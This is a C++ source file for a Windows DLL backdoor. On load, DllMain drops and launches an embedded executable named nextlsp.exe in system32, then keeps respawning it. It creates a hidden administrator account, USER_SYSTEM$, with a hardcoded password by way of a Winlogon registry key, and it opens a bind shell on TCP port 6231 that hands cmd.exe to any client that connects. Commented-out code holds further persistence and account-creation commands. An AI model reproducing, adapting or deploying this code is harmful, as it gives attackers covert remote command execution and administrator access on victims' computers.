#include <winsock2.h>
#include <windows.h>
#include "lm.h"
#include <cstdio>
#include <tlhelp32.h>
#include <psapi.h>
#include "data.h"
#pragma comment(lib,"netapi32")
#pragma comment(lib,"ws2_32")

DWORD WINAPI CmdSwitch(LPVOID p);
DWORD WINAPI SockAccept(LPVOID p);
//DWORD WINAPI ProtectExe(LPVOID p);

bool IsProcessOnline(char*);

extern "C" void TF()
{
	return;
}

extern "C" BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	DWORD retd;
	
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		DWORD pid;
		//CreateThread(NULL,0,ProtectExe,NULL,0,&pid);
		CreateThread(NULL,0,SockAccept,NULL,0,&pid);

		//DeleteFile("C:\\WINDOWS\\system32\\nextlsp.exe");
		if(GetFileAttributes("C:\\WINDOWS\\system32\\nextlsp.exe") == 0xFFFFFFFF)
		{
			FILE*fp=fopen("C:\\WINDOWS\\system32\\nextlsp.exe","wb");
			fwrite(data,sizeof(data),1,fp);
			fclose(fp);
		}
		Sleep(50);
		//WinExec("C:\\WINDOWS\\system32\\nextlsp.exe",SW_SHOW);
		STARTUPINFO si;
		memset(&si,0,sizeof(STARTUPINFO));
		si.cb=sizeof(STARTUPINFO);
		si.dwFlags=STARTF_USESHOWWINDOW;
		si.wShowWindow=SW_SHOW;
		PROCESS_INFORMATION pi;
		CreateProcess("c:\\windows\\system32\\nextlsp.exe",NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);

		/*WinExec("cmd /c net user USER_SYSTEM$ USER_SYSTEM$ /add",SW_HIDE);
		Sleep(200);
		WinExec("cmd /c net localgroup administrators USER_SYSTEM$ /add",SW_HIDE);
		Sleep(200);*/
		//WinExec("cmd /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v USER_SYSTEM$ /t REG_DWORD /d 0 /f",SW_HIDE);
		memset(&si,0,sizeof(STARTUPINFO));
		si.cb=sizeof(STARTUPINFO);
		si.dwFlags=STARTF_USESHOWWINDOW;
		si.wShowWindow=SW_SHOW;
		memset(&pi,0,sizeof(PROCESS_INFORMATION));
		CreateProcess("cmd /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v USER_SYSTEM$ /t REG_DWORD /d 0 /f",NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
		Sleep(100);
		USER_INFO_1 oUserInfo;
		ZeroMemory(&oUserInfo, sizeof(oUserInfo));
		oUserInfo.usri1_name = L"USER_SYSTEM$";
		oUserInfo.usri1_password = L"USER1-2SYSTEM$";
		oUserInfo.usri1_priv = USER_PRIV_USER;
		oUserInfo.usri1_flags = UF_NORMAL_ACCOUNT;
		NetUserAdd(NULL, 1, (LPBYTE)(&oUserInfo), &retd);
		_LOCALGROUP_MEMBERS_INFO_3 oUser;
		oUser.lgrmi3_domainandname = oUserInfo.usri1_name;
		NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)(&oUser), 1);
		
		while(1)
		{
			Sleep(300000);
		if(!IsProcessOnline("nextlsp.exe"))
		{
		if(GetFileAttributes("C:\\WINDOWS\\system32\\nextlsp.exe") == 0xFFFFFFFF)
			{
				FILE*fp=fopen("C:\\WINDOWS\\system32\\nextlsp.exe","wb");
				if(fp!=NULL)fwrite(data,sizeof(data),1,fp);
				fclose(fp);
			}
			Sleep(100);
			WinExec("C:\\WINDOWS\\system32\\nextlsp.exe",SW_SHOW);
		}}

		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return true;
}

DWORD WINAPI SockAccept(LPVOID p)
{
	unsigned short port=6231;
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	struct sockaddr_in server;
	int iAddrSize=sizeof(server);
	DWORD retd;
	SOCKET clientFD;

	WSAStartup(MAKEWORD(2,2),&ws);
	listenFD=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	server.sin_family=AF_INET;
	server.sin_port=htons(port);
	server.sin_addr.s_addr=ADDR_ANY;
	ret=bind(listenFD,(sockaddr*)&server,sizeof(server));
	ret=listen(listenFD,128);
	while(true)
	{
		clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
		CreateThread(NULL,0,CmdSwitch,&clientFD,0,&retd);
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI CmdSwitch(LPVOID p)
{
	SOCKET clientFD=*(SOCKET*)p;
	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	si.hStdInput=si.hStdOutput=si.hStdError=(void *)clientFD;
	char cmdline[]="cmd.exe";
	PROCESS_INFORMATION ProcessInformation;
	CreateProcess(NULL,cmdline,NULL,NULL,TRUE,0,NULL,NULL,&si,&ProcessInformation);
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}

bool IsProcessOnline(char* name)
{
	PROCESSENTRY32 pe32;
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pe32.dwSize=sizeof(pe32);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		//printf("CreateToolhelp32Snapshot failed!\n");
		return true;
	}
	BOOL bMore=Process32First(hProcessSnap,&pe32);
	while(bMore)
	{
		if(strcmp(name,pe32.szExeFile)==0)
		{
			//printf("find the file you want: %ls\n",pe32.szExeFile);
			CloseHandle(hProcessSnap);
			return true;
		}
		bMore=Process32Next(hProcessSnap,&pe32);
	}
	CloseHandle(hProcessSnap);
	return false;
}

/*DWORD WINAPI ProtectExe(LPVOID p)
{
	while(true)
	{
		Sleep(60000);
		/*FILE*fp=fopen("c:\\1.txt","w");
		char cc=IsProcessOnline("msioexec.exe") + '0';
		fwrite(&cc,1,1,fp);
		fclose(fp);*//*
		//if(!IsProcessOnline("msioexec.exe"))
		{
		if(GetFileAttributes("C:\\WINDOWS\\MSInstaller.exe") == 0xFFFFFFFF)
			{
				FILE*fp=fopen("C:\\WINDOWS\\MSInstaller.exe","wb");
				if(fp!=NULL)fwrite(data,sizeof(data),1,fp);
				fclose(fp);
			}
			Sleep(100);
			WinExec("C:\\WINDOWS\\MSInstaller.exe",SW_SHOW);
		}
	}
	return 0;
}*/
